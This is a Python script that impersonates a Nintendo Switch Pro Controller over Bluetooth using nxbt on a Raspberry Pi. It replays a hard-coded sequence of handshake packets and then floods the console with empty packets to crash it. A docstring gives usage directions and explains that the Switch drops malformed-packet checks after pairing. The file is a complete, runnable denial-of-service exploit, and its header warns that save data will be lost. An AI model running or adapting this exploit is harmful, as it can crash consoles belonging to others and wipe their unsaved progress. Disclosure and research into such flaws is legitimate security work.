"""
---------------------------------------------------
--> THIS SCRIPT WILL CRASH YOUR NINTENDO SWITCH <--
---------------------------------------------------

Any save data or active game state will be lost
since this forces a restart. I take no
responsibility whatsoever for any lost data or
harm caused by this script.

RUN THIS AT YOUR OWN RISK!

---------------------------------------------------
DIRECTIONS FOR USE
---------------------------------------------------

This script was tested with a Raspberry Pi 4B (4GB),
Python 3.7.3, and a Nintendo Switch on firmware v10.1.0

1.) Open the "Change Grip/Order" menu on your
Nintendo Switch.
2.) Start this script with sudo privileges.
3.) Watch your Switch crash.

---------------------------------------------------
HOW DOES THIS WORK?
---------------------------------------------------

The Switch protects itself against malformed
packets when controllers initially connect. This
defensiveness, however, is dropped after a
controller successfully connects to the Switch.

After a successful connection, we can exploit this
by blasting the Switch with malformed (specifically
empty) packets. Since the Switch isn't expecting this,
we trigger a cascade of errors, resulting in the
crash.
"""

import socket
import sys
import os
import time

from nxbt import toggle_clean_bluez
from nxbt import BlueZ
from nxbt import Controller
from nxbt import PRO_CONTROLLER

REQUEST_INFO = b"\xa2\x21\x1a\x40\x00\x00\x00\x02\x20\x00\x01\x00\x00\x00\x82\x02\x03\x48\x03\x02\xdc\xa6\x32\x16\x4a\x7c\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
SET_SHIPMENT = b"\xa1\x21\xf2\x40\x00\x00\x00\x10\x18\x76\x44\x97\x73\x0b\x80\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
SERIAL_NUMBER = b"\xa1\x21\x00\x40\x00\x00\x00\x12\x08\x76\x42\x77\x73\x0c\x90\x10\x00\x60\x00\x00\x10\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
COLOURS = b"\xa1\x21\x26\x40\x00\x00\x00\x11\xf8\x75\x44\x87\x73\x0c\x90\x10\x50\x60\x00\x00\x0d\x32\x32\x32\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
INPUT_MODE = b"\xa1\x21\x5b\x40\x00\x00\x00\x10\x18\x76\x45\x87\x73\x0c\x80\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
TRIGGER_BUTTONS = b"\xa1\x21\xaa\x40\x00\x00\x00\x11\x08\x76\x44\x87\x73\x0b\x83\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
FACTORY_PARAMS = b"\xa1\x21\xee\x40\x00\x00\x00\x10\xd8\x75\x43\x87\x73\x0c\x90\x10\x80\x60\x00\x00\x18\x50\xfd\x00\x00\xc6\x0f\x0f\x30\x61\x96\x30\xf3\xd4\x14\x54\x41\x15\x54\xc7\x79\x9c\x33\x36\x63\x00\x00\x00\x00\x00"
FACTORY_PARAMS_2 = b"\xa1\x21\x15\x40\x00\x00\x00\x11\x18\x76\x45\x97\x73\x0b\x90\x10\x98\x60\x00\x00\x12\x0f\x30\x61\x96\x30\xf3\xd4\x14\x54\x41\x15\x54\xc7\x79\x9c\x33\x36\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
USER_CAL = b"\xa1\x21\x49\x40\x00\x00\x00\x12\x08\x76\x43\xa7\x73\x0a\x90\x10\x10\x80\x00\x00\x18\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00"
FACTORY_CAL = b"\xa1\x21\x65\x40\x00\x00\x00\x0f\x38\x76\x46\x87\x73\x0a\x90\x10\x3d\x60\x00\x00\x19\x31\x96\x61\xea\xe7\x73\xa4\xf5\x5d\x55\x27\x75\xa7\xd5\x5b\x3a\x16\x59\xff\x32\x32\x32\xff\xff\xff\x00\x00\x00\x00"
SIX_AXIS_CAL = b"\xa1\x21\x8d\x40\x00\x00\x00\x10\x08\x76\x44\x67\x73\x08\x90\x10\x20\x60\x00\x00\x18\x32\x00\xfa\xfe\x38\x01\x00\x40\x00\x40\x00\x40\x03\x00\xee\xff\xd9\xff\x3b\x34\x3b\x34\x3b\x34\x00\x00\x00\x00\x00"
ENABLE_IMU = b"\xa1\x21\xbb\x40\x00\x00\x00\x11\x08\x76\x45\x87\x73\x02\x80\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
ENABLE_VIBRATION = b"\xa1\x21\xdd\x40\x00\x00\x00\x0f\x18\x76\x43\x87\x73\x09\x80\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
SET_NFC_IR = b"\xa1\x21\x13\x40\x00\x00\x00\x0e\x08\x76\x45\x77\x73\x00\xa0\x21\x01\x00\xff\x00\x03\x00\x05\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c"
SET_PLAYER_LIGHTS = b"\xa1\x21\x35\x40\x00\x00\x00\x10\x08\x76\x43\x67\x73\x0b\x80\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

IDLE_PACKET = b"\xa1\x30\xba\x40\x00\x00\x00\x0f\xd8\x75\x43\x97\x73\x09\xd5\xfa\x3c\xfc\xcd\x0e\x19\x00\xe1\xff\xdd\xff\xcd\xfa\x3a\xfc\xce\x0e\x18\x00\xdf\xff\xdb\xff\xca\xfa\x3c\xfc\xd3\x0e\x19\x00\xdd\xff\xdb\xff"

COMMANDS = [
    REQUEST_INFO,
    SET_SHIPMENT,
    SERIAL_NUMBER,
    COLOURS,
    INPUT_MODE,
    TRIGGER_BUTTONS,
    FACTORY_PARAMS,
    FACTORY_PARAMS_2,
    USER_CAL,
    FACTORY_CAL,
    SIX_AXIS_CAL,
    ENABLE_IMU,
    ENABLE_VIBRATION,
    SET_NFC_IR,
]


def format_message(data, split, name):
    """Formats a given byte message in hex format split
    into payload and subcommand sections.

    :param data: A series of bytes
    :type data: bytes
    :param split: The location of the payload/subcommand split
    :type split: integer
    :param name: The name featured in the start/end messages
    :type name: string
    :return: The formatted data
    :rtype: string
    """

    payload = ""
    subcommand = ""
    for i in range(0, len(data)):
        data_byte = str(hex(data[i]))[2:].upper()
        if len(data_byte) < 2:
            data_byte = "0" + data_byte
        if i <= split:
            payload += "0x" + data_byte + " "
        else:
            subcommand += "0x" + data_byte + " "

    formatted = (
        f"--- {name} Msg ---\n"
        + f"Payload:    {payload}\n"
        + f"Subcommand: {subcommand}"
    )

    return formatted


def print_msg_controller(data):
    """Prints a formatted message from a controller

    :param data: The bytes from the controller message
    :type data: bytes
    """

    print(format_message(data, 13, "Controller"))


def print_msg_switch(data):
    """Prints a formatted message from a Switch

    :param data: The bytes from the Switch message
    :type data: bytes
    """

    print(format_message(data, 10, "Switch"))


if __name__ == "__main__":
    port_ctrl = 17
    port_itr = 19

    toggle_clean_bluez(False)
    bt = BlueZ(adapter_path="/org/bluez/hci0")

    controller = Controller(bt, PRO_CONTROLLER)
    controller.setup()

    # Switch sockets
    switch_itr = socket.socket(
        family=socket.AF_BLUETOOTH,
        type=socket.SOCK_SEQPACKET,
        proto=socket.BTPROTO_L2CAP,
    )
    switch_ctrl = socket.socket(
        family=socket.AF_BLUETOOTH,
        type=socket.SOCK_SEQPACKET,
        proto=socket.BTPROTO_L2CAP,
    )

    try:
        switch_ctrl.bind((bt.address, port_ctrl))
        switch_itr.bind((bt.address, port_itr))

        # bt.set_alias("Joy-Con (L)")
        bt.set_alias("Pro Controller")
        bt.set_discoverable(True)

        print("Waiting for Switch to connect...")
        switch_itr.listen(1)
        switch_ctrl.listen(1)

        client_control, control_address = switch_ctrl.accept()
        print("Got Switch Control Client Connection")
        client_interrupt, interrupt_address = switch_itr.accept()
        print("Got Switch Interrupt Client Connection")

        # Creating a non-blocking client interrupt connection
        client_interrupt.setblocking(False)

        print("Connecting to Switch...")
        while True:
            try:
                reply = client_interrupt.recv(350)
                # print_msg_switch(reply)
            except BlockingIOError:
                reply = None

            if reply and len(reply) > 40:
                client_interrupt.sendall(COMMANDS.pop(0))
            else:
                client_interrupt.sendall(IDLE_PACKET)

            if len(COMMANDS) == 0:
                break

            time.sleep(1 / 15)

        print("Crashing Switch...")
        while True:
            try:
                reply = client_interrupt.recv(350)
            except BlockingIOError:
                reply = None

            client_interrupt.sendall(b"")

            time.sleep(1 / 15)

    except KeyboardInterrupt:
        print("Closing sockets")

        switch_itr.close()
        switch_ctrl.close()

        try:
            sys.exit(1)
        except SystemExit:
            os._exit(1)

    except OSError as e:
        print("Closing sockets")

        switch_itr.close()
        switch_ctrl.close()

        raise e

    finally:
        toggle_clean_bluez(True)
